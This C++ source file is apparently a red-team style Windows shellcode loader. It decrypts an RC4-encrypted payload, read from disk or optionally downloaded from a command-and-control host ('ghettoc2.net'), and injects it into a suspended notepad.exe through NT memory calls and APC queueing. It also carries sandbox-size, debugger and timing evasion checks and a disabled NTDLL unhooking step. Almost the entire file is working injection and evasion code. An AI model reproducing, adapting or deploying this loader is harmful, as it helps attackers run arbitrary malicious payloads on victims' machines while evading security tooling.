#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#include "syscalls.h"

#pragma comment(lib, "winhttp.lib")

#define DEBUGGING 0
#define USEHTTP 0

#define MAXSHELLCODESIZE 4096

#define _CRT_SECURE_NO_DEPRECATE
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

#pragma warning (disable : 4996)

using namespace std;

// External or forward declared routines
#if USEHTTP == 1
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
#endif

BOOL ClearNTDLL();

// For SystemFunction033 (built in RC4 decrypt)
typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, key;

unsigned char   buf[MAXSHELLCODESIZE];

BOOL timing_CreateWaitableTimer(UINT delayInMillis)
{
    HANDLE hTimer;
    LARGE_INTEGER dueTime;

    BOOL bResult = FALSE;

    dueTime.QuadPart = delayInMillis * -10000LL;

    hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

    if (hTimer == NULL)
    {
        return TRUE;
    }

    if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
    {
        bResult = TRUE;
    }
    else {
        if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
        {
            bResult = TRUE;
        }
    }

    CancelWaitableTimer(hTimer);
    CloseHandle(hTimer);
    return bResult;
}

//sandbox check to check hardrive 
BOOL getsandbox_drive_size() {
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;

    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {
        // Someone is playing tricks. Or not encoded_kwdikas enough privileges.
        CloseHandle(drive);
        return FALSE;
    }

    BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
    CloseHandle(drive);

    if (result != 0) {
        if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
            return FALSE;
    }

    return TRUE;
}

BOOL checkup()
{
    BOOL bIsDbgPresent = FALSE;

    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);

    if (bIsDbgPresent) {
#if DEBUGGING == 1
        fprintf(stderr, "Remote debugger found, %d\n", bIsDbgPresent);
#endif
        return FALSE;
    }

    if (timing_CreateWaitableTimer(4000)) {
#if DEBUGGING == 1
        fprintf(stderr, "CreateWaitable Timer event\n");
#endif
        return FALSE;
    }

    return TRUE;

}

unsigned long temp;

int main(int argc, char **argv)
{
	char _key[] = "advapi32.dll";
#if DEBUGGING == 1
	int i;
#endif

#if 0
	if (!checkup()) {
        fprintf(stderr, "Bailing out\n");
        return 0;
    }

	//	fprintf(stderr, "Unhooking\n");

#if DEBUGGING == 1
	printf("Start unhooking, press any key to continue...\n");
	getchar();
#endif

	// Unhook NTDLL via indirect syscalls
	if (!ClearNTDLL()) {
		printf("[-] Error unhooking.\n");
		return -1;
	}

	//	fprintf(stderr, "Unhooked\n");

#if DEBUGGING == 1
	printf("Unhooked, press any key to continue...\n");
	getchar();
#endif
#endif

    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary("advapi32"), "SystemFunction033");

    NTSTATUS        ntstatus;
    LPVOID          start_address = NULL;
    SIZE_T          code_size;
    DWORD           oldProtect = NULL;
	unsigned long shellcode_size;

#if DEBUGGING == 1
    printf("Starting download\n");
#endif

#if USEHTTP == 0
	unsigned int  bytesread;
#endif

#if USEHTTP == 1
	std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
	shellcode_size = (unsigned long)(shellcode.size());
#else
	char *infile, defaultfile[] = "shellcode.enc";
	FILE *fp;

	infile = argc == 2 ? argv[1] : defaultfile;

	if ((fp = fopen(infile, "rb")) == NULL) {
		fprintf(stderr, "Cannot open input file %s\n", infile);
		exit(1);
	}

	if ((bytesread = fread(buf, sizeof(char), MAXSHELLCODESIZE, fp)) == 0) {
		if (ferror(fp)) {
			fprintf(stderr, "File %s read error %d\n", infile, errno);
		}
		else {
			fprintf(stderr, "File %s is empty\n", infile);
		}
		fclose(fp);
		exit(1);
	}

	fclose(fp);
	shellcode_size = (unsigned long)bytesread;
	temp = shellcode_size;
#endif

#if DEBUGGING == 1
    printf("Shellcode size is %d\n", shellcode_size);
#endif

	if (shellcode_size == 0) {
		fprintf(stderr, "Shellcode size is 0, error\n");
		return 0;
	}
    if (shellcode_size > MAXSHELLCODESIZE) {
        fprintf(stderr, "Shellcode too big (%d bytes), max size is %d bytes\n", shellcode_size, MAXSHELLCODESIZE);
        return 0;
    }

    // create startup info struct
    LPSTARTUPINFOA startup_info = new STARTUPINFOA();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    char cmd[] = "notepad.exe";

    // create process
	if (!CreateProcessA(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED,
		NULL,
		NULL,
		startup_info,
		process_info)) {
		// fprintf(stderr, "Error %lx creating process\n", GetLastError());
		exit(0);
	}

#if DEBUGGING == 1
    printf("Started a suspended notepad, pid %d, check with processhacker or taskmanager and then press enter to continue...\n", GetProcessId(process_info->hProcess));
    getchar();
#endif

    // Allocate Virtual Memory
    code_size = (SIZE_T)shellcode_size;
//	fprintf(stderr, "1.Shellcode size is %d\n", shellcode_size);
	ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	fprintf(stderr, "1a.Shellcode size is %d\n", shellcode_size);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d\n", (unsigned __int64)start_address, (unsigned int)code_size);
        printf("Press enter to continue...\n");
        getchar();
#endif
    }

	shellcode_size = temp;
	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
#if USEHTTP == 1
	std::copy(begin(shellcode), end(shellcode), buf);
#endif

	// decrypt the downloaded shellcode with SystemFunction033
	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof(_key);
	key.MaximumLength = sizeof(_key);

	shellcode_size = temp;
	fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
	temp = shellcode_size;

	_data.Buffer = (PUCHAR)buf;
	_data.Length = shellcode_size;
	_data.MaximumLength = shellcode_size;
	
#if DEBUGGING == 1
	int i;
	fprintf(stderr, "Key structure, size %d:\n", sizeof(key));
	struct ustring *p = &key;
	unsigned char *c = (unsigned char *)p;
	for (i = 0; i < sizeof(key); i++) {
		fprintf(stderr, "0x%02x ", c[i]);
	}
	fprintf(stderr, "\n");
	fprintf(stderr, "Data structure, size %d:\n",sizeof(_data));
	p = &_data;
	c = (unsigned char *)p;
	for (i = 0; i < sizeof(key); i++) {
		fprintf(stderr, "0x%02x ", c[i]);
	}
	fprintf(stderr, "\n");
#endif
	
	SystemFunction033(&_data, &key);

	shellcode_size = temp;
	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);

#if DEBUGGING == 1
	printf("Decrypted, press enter to continue...\n");
	getchar();
#endif

	shellcode_size = temp;
	fprintf(stderr, "Decrypted, shellcode size is %d\n", shellcode_size);

	// Copy encrypted shellcode into allocated memory
	//fprintf(stderr, "4.Shellcode size is %d\n", shellcode_size);
	ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %x\n", (unsigned int)ntstatus);
#endif
		return 0;
	}
	else {
#if DEBUGGING == 1
		fprintf(stderr, "Memory written with decrypted shellcode\n");
		printf("Press enter to continue...\n");
		getchar();
#endif
	}

	//fprintf(stderr, "Written, shellcode size is %d\n", shellcode_size);

    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "Memory Protected\n");
        printf("Press enter to continue...\n");
        getchar();
#endif
    }

	fprintf(stderr, "Memory protected, check with processhacker\n");
	getchar();

    ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtQueueApcThread error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "APC thread queued\n");
#endif
    }

	fprintf(stderr, "In the queue!\n");
	getchar();

    ntstatus = NtResumeThread(process_info->hThread, NULL);
    if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
        fprintf(stderr, "NtResumeThread error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#if DEBUGGING == 1
        fprintf(stderr, "Thread resumed\n");
#endif
    }

	fprintf(stderr, "Resumed\n");
	getchar();

    // close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
#if DEBUGGING == 1
    printf("All done, bye!\n");
    getchar();
#endif
    return 1;
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0); // no ssl
 //       WINHTTP_FLAG_SECURE);          // enable ssl

        // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        443,            // port 8000
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
    //    0); // no ssl
        WINHTTP_FLAG_SECURE);                   // ssl

        // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}